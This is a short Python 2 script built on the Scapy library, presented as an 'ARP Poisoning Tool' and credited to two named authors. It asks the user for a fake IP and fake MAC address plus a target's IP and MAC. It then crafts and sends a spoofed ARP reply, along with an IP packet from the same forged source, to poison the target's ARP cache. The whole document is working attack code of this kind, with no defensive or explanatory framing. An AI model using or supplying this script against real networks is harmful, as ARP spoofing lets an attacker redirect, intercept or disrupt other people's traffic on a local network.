from scapy.all import *
import os

def main():
    os.system("clear")
    print "### Welcome to ARP Poisoning Tool ###","\n"

    ARP_Packet = ARP()
    ICMP_Packet = IP()
    ARP_Packet.op = 2

    DestinationIP(ARP_Packet,ICMP_Packet)
    DestinationHW(ARP_Packet)
    SourceIP(ARP_Packet,ICMP_Packet)
    SourceHW(ARP_Packet)

    print "\n"
    ICMP_Packet.display()
    print "\n"
    ARP_Packet.show()
    
    send(ICMP_Packet)
    send(ARP_Packet)

    print "\n### Emre OVUNC && Ayse Simge OZGER ###\n"
    
def SourceIP(ARP_Packet,ICMP_Packet):
    srcIP = raw_input ("Fake IP : ")
    ARP_Packet.psrc = srcIP
    ICMP_Packet.src = srcIP

def DestinationIP(ARP_Packet,ICMP_Packet):
    dstIP= raw_input ("Destination IP : ")
    ARP_Packet.pdst = dstIP
    ICMP_Packet.dst = dstIP

def SourceHW(ARP_Packet):
    fakeMAC = raw_input ("Fake MAC : ")
    ARP_Packet.hwsrc = fakeMAC

def DestinationHW(ARP_Packet):
    dstMAC = raw_input ("Destination MAC : ")
    ARP_Packet.hwdst = dstMAC
  
main()
